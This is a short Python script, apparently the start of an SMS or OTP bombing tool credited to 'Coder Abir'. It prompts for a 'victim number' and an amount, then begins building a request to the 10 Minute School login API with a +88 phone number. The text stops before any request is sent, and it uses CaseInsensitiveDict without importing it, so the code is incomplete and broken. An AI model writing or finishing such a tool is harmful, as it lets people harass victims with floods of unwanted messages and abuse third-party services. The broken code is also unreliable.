import pyfiglet
import os
import requests,sys,time
 
def axak(panda):
   for xak in panda+"\n":
    sys.stdout.write(xak)
    sys.stdout.flush()
    time.sleep(0.004)
os.system("clear")
axak("""\033[1;32m
                       \033[1;37m   [Coder Abir]                
""")
number = str(input("\nENTER YOUR VICTIM NUMBER :>> "))
amount =int(input("\nENTER YOUR AMOUNT :>> "))
 
url1 = "https://api.10minuteschool.com/lms-auth-service/api/v4/auth/userExists"
headers1 = CaseInsensitiveDict()
headers1["Content-Type"] = "application/json"
data1 = '{"contact":"+88'+number+'","type":"phone"}'